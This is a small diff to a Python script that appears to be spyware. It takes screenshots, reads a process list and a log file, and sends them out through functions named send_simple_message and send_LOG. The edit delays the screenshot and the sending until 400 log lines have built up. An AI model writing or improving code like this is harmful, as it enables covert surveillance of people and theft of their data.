@@ -5,6 +5,7 @@ import time
 import pyscreenshot as ImageGrab
 import subprocess
 
+
 def processlist_sort():
     file = open("Process_list.txt", "r")
     sortedlist = file.read()
@@ -86,13 +87,13 @@ if __name__ == "__main__":
          file_content = f.read()
          f.close()
 
-         screenShot()
          with open('LOG.txt') as f:
              # len(f.readlines())
              count = (sum(1 for _ in f))
              print ('count:', count)
 
-         if (count >= 10):
+         if (count >= 400):
+            screenShot()
             parse_process_list()
             send_simple_message(file_content)
             send_LOG()
